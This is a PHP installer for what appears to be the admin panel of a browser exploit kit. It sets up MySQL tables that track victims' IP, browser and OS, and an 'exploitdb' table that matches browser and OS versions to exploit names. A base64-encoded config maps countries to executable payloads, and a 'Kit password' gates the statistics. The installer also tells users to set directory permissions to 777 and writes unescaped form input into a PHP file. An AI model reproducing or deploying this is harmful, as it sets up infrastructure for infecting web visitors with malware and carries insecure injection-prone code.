<?php
$config=base64_decode("PD9waHANCiREQkhPU1QgPSAiaG9zdG5hbWUiOw0KJERCTkFNRSA9ICJkYXRhYmFzZW5hbWUiOw0KJERCVVNFUiA9ICJ1c2VybmFtZSI7DQokREJQQVNTID0gInVzZXJwYXNzd29yZCI7DQokQURNSU5QVyA9ICJhZG1pbmhhc2giOyAvL1NIQS0xIEhhc2ggZnJvbSB5b3VyIHBhc3N3b3JkDQokQUNUSVZBVElPTl9QQVNTV09SRCA9ICJhY3RpdmF0ZWhhc2giOyAvL1NIQS0xIEhhc2ggZnJvbSB5b3VyIGFjdGl2YXRpb24gcGFzc3dvcmQNCiRCQU5USU1FID0gODY0MDA7DQokU09VTkQgPSAiRGlzYWJsZWQiOw0KJENPVU5UUklFUyA9IGFycmF5KCJSVSIgPT4gIkVYRU5BTUUuZXhlIiwgIkRFIiA9PiAiRVhFTkFNRS5leGUiLCAiVVMiID0+ICJFWEVOQU1FLmV4ZSIpOw0KPz4=");

function rndvar($min,$max)
			{
				$len = mt_rand( $min, $max );
    				$chss = "abcdefghijkxy";
    				$chsg = "lmnopqrstuvwz";
				$v = "";
				$i = 0;
				for ( ; $i < $len; $i++ )
					{
						$v .= $i % 2 == 0 ? $chss[mt_rand( 0, strlen( $chss ) - 1 )] : $chsg[mt_rand( 0, strlen( $chsg ) - 1 )];
					}
				if ( mt_rand( 0, 3 ) == 0 )
					{
						$v .= mt_rand( 1, 9 );
    					}
    				return $v;
			}
function WriteFile($path,$data)
	{
		$file = $path;
		$fh = fopen($file, "w") or die("File ($file) does not exist!");
		fwrite($fh, $data);
		fclose($fh);
	}
$lang="en";
if($lang=="en")
{
echo "<!DOCTYPE html>
<html>
<head>

	<title>install</title>
	<link rel='stylesheet' type='text/css' href='installl.css'>

</head>
<body>
<div class='maindiv'>
<h1>Instructions :</h1>
<ul>
	<li>Make CHMOD 777 on the directory where this file install.php is located</li>
	<li>Create MySQL database</li>
	<li>Fill all of the fields showed below with data of created MySQL database:</li>
</ul>
<form method='POST' action='install.php' onSubmit='return onSend()'>
<table>
	<tr>
		<td><font>MySQL host:</font></td>
		<td><input name='host' id='host' type='text' placeholder='Host'></td>
	</tr>
	<tr>
		<td><font >MySQL database name:</font></td>
		<td><input name='dbname' id='dbname' type='text' placeholder='Database'></td>
	</tr>
	<tr>
		<td><font>MySQL username:</font></td>
		<td><input name='dbuname' id='dbuname' type='text' placeholder='Username'></td>
	</tr>
	<tr>
		<td><font>MySQL password:</font></td>
		<td><input name='dbupassword' id='dbupassword' type='password' placeholder='Password'></td>
	</tr>
	<tr>
		<td><font>Password to access statistics:</font></td>
		<td><input name='adminpw' id='adminpw' type='password' placeholder='Kit password'></td>
	</tr>
	<tr>
		<td><font>Repeat password:</font></td>
		<td><input name='repeatadminpw' id='repeatadminpw' type='password' placeholder='Repeat Kit Password'></td>
	</tr>
</table>	
<input type='hidden' name='language' value='en'></input>
<input type='hidden' name='path' id='path' value='path'></input>
<br>
<input type='submit' name='back' value='Back'></input>
<input type='submit' value='Install'></input>

</form>
</div>
</body>
</html>
"
;}
if (isset($_POST['back']))
{
echo"<html><head><meta http-equiv='refresh' content='0;URL=guiek.php'></head></html>";
exit();
}
elseif (isset($_POST['language']))
	{
		$language=$_POST['language'];
		$DBHOST=$_POST['host'];
		$DBUSER=$_POST['dbuname'];
		$DBPASS=$_POST['dbupassword'];
		$DBNAME=$_POST['dbname'];
		$ADMINPW=$_POST['adminpw'];
		if ($language=='en')
			{
				$connection=mysqli_connect( $DBHOST, $DBUSER, $DBPASS);
				if ( !mysqli_connect( $DBHOST, $DBUSER, $DBPASS ) )
					{
						echo "Installation was not completed! Unable to connect to MySQL host. Check MySQL settings and try again.";
						exit();
					}
				if ( !mysqli_select_db( $connection, $DBNAME ) )
					{
						echo "Installation was not completed! The software was able to connect to MySQL host but created MySQL database was not found. Check database name and try again.";
						exit();
					}
				$install = mysqli_query($connection,"CREATE TABLE IF NOT EXISTS `stats` (
  				`id` int(11) unsigned NOT NULL auto_increment,
  				`ip` int(10) unsigned NOT NULL,
  				`time` int(10) unsigned NOT NULL,
  				`browver` varchar(20) NOT NULL,
  				`browtype` varchar(20) NOT NULL,
  				`osver` varchar(20) NOT NULL,
  				`mac` varchar(16) NOT NULL,
  				`client` varchar(50) NOT NULL,
  				`source` varchar(50) NOT NULL,
  				`hit` int(11) NOT NULL,
  				PRIMARY KEY  (`id`),
  				KEY `ip` (`ip`),
  				KEY `time` (`time`)
				) ENGINE=MyISAM DEFAULT CHARSET=cp1251 AUTO_INCREMENT=1 ;");
				
				$installexploitdb = mysqli_query($connection,"CREATE TABLE IF NOT EXISTS exploitdb (
  				id int(11) NOT NULL,
  				os varchar(20) NOT NULL,
                browser varchar(20) NOT NULL,
                browserver varchar(20) NOT NULL,
  				exploitname varchar(20) NOT NULL,
  				PRIMARY KEY  (id)); ");
				
				$installanalytics = mysqli_query($connection,"CREATE TABLE IF NOT EXISTS analytics (
				id int(11) NOT NULL auto_increment,
                today_date varchar(20) NOT NULL,
                no_of_visitors int(11) NOT NULL,
				no_of_hits varchar(10) NOT NULL,
                PRIMARY KEY  (id)); ");
				if($error=mysqli_error($connection))
					{
						echo "Installation wasn't completed cuz of MySQL's error. MySQL error description:";
    					print $error;
						exit();
					}
				else
					{
						echo "<font color='green'>Creating table in database... DONE</font><br>";
						$ACTIVATION_PASSWORD=rndvar(10,15);
						$cdatatoreplace=array("hostname","username","userpassword","databasename","adminhash","activatehash");
						$cdataforreplace=array($DBHOST,$DBUSER,$DBPASS,$DBNAME,sha1($ADMINPW),sha1($ACTIVATION_PASSWORD));
						$config=str_replace($cdatatoreplace, $cdataforreplace, $config);
						WriteFile("databasedetails.php",$config);
						echo"<html><head><meta http-equiv='refresh' content='0;URL=guiek.php'></head></html>";
					}
			}
	}

?>
